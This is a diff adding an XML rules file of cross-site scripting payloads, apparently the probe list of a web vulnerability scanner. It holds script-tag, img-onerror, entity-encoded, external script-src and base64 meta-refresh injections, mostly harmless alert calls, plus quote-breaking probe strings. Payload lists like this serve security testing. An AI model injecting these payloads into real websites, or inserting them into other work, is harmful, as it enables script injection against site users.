@@ -1,0 +1,36 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rules>
+    <couple id="1">
+        <requests>
+            '"/&gt;&lt;script&gt;alert(/RANDOMIZE/)&lt;/script&gt;
+            '"/&gt;&lt;img src=x onerror=alert(/RANDOMIZE/)&gt;
+            '"/&gt;&lt;img src=x onerror=console.log(/RANDOMIZE/)&gt;
+            '"/&gt;&lt;img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#47;&#72;&#73;&#72;&#73;&#72;&#73;&#47;&#41;"&gt;
+            '"/&gt;&lt;SCRIPT/SRC=HTTP://R.W/&gt;&lt;/SCRIPT&gt;
+            '"/&gt;&lt;SCRIPT&gt;alert(/RANDOMIZE/);//&lt;&lt;/SCRIPT&gt;
+            '"/&gt;&lt;meta http-equiv="refresh" content="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"&gt;
+        </requests>
+    </couple>
+    <couple id="2">
+        <requests>
+            &lt;script&gt;alert(/RANDOMIZE/)&lt;/script&gt;
+            &lt;img src=x onerror=alert(/RANDOMIZE/)&gt;
+            &lt;img src=x onerror=console.log(/RANDOMIZE/)&gt;
+            &lt;img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#47;&#72;&#73;&#72;&#73;&#72;&#73;&#47;&#41;"&gt;
+            &lt;script&gt;&lt;/script&gt;
+            &lt;SCRIPT/SRC=HTTP://R.W/&gt;&lt;/SCRIPT&gt;
+            &lt;SCRIPT&gt;alert(/RANDOMIZE/);//&lt;&lt;/SCRIPT&gt;
+            &lt;meta http-equiv="refresh" content="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"&gt;
+        </requests>
+    </couple>
+    <couple id="4">
+        <requests>
+            'RANDOMIZE&lt;/-&gt;
+            RANDOMIZE/*
+            RANDOMIZE"RANDOMIZE
+            RANDOMIZE'RANDOMIZE
+            RANDOMIZE`RANDOMIZE
+            RANDOMIZE =
+        </requests>
+    </couple>
+</rules>
